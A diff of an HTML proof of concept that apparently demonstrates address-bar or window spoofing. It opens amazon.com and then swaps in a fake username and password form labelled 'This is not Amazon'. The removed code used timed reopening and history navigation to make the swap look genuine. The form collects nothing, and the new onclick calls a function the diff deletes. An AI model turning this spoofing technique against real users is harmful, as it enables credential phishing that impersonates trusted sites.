@@ -1,54 +1,16 @@
 <head>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
 
 <body>
-  <a href="#" id="button">Spoof</a>
+<a href="javascript:window.open('https://www.amazon.com/','x');" onclick="startSpoof()" id="button">Spoof</a>
 </body>
 
 <script>
-  function startSpoof() {
-    // 1. Klik tombol membuka Amazon
-    const amazonTab = window.open('https://www.amazon.com/', 'x');
-
-    // 2. Setelah beberapa saat, kembali ke halaman sebelumnya
-    setTimeout(() => {
-      if (history.length > 1) {
-        window.history.back();
-      }
-
-      // 3. Buka Amazon lagi secara otomatis agar terlihat seperti browser normal
-      setTimeout(() => {
-        const spoofWin = window.open('https://www.amazon.com/', 'x');
-
-        // 4. Hindari race condition: jangan langsung mengganti body saat popup sedang dibuat
-        //    tunggu sedikit agar popup/halaman sudah siap, lalu ganti DOM
-        setTimeout(() => {
-          try {
-            if (spoofWin && spoofWin.document) {
-              spoofWin.document.body.innerHTML = `
-                <h1>This is not Amazon</h1>
-                <input type="text" placeholder="Username" id="username"><br>
-                <input type="password" placeholder="Password" id="password"><br>
-                <button type="button">Click me</button>
-              `;
-            }
-          } catch (err) {
-            // fallback jika popup diblokir atau cross-origin
-            document.body.innerHTML = `
-              <h1>This is not Amazon</h1>
-              <input type="text" placeholder="Username" id="username"><br>
-              <input type="password" placeholder="Password" id="password"><br>
-              <button type="button">Click me</button>
-            `;
-          }
-        }, 300);
-      }, 300);
-    }, 1000);
-  }
-
-  document.getElementById('button').addEventListener('click', function (event) {
-    event.preventDefault();
-    startSpoof();
-  });
+document.getElementById('button').addEventListener('click', function() {
+document.body.innerHTML = ` <h1>This is not Amazon</h1>
+<input type="text" placeholder="Username" id="username"><br>
+<input type="password" placeholder="Password" id="password"><br>
+<button>Click me</button>`;
+});
 </script>
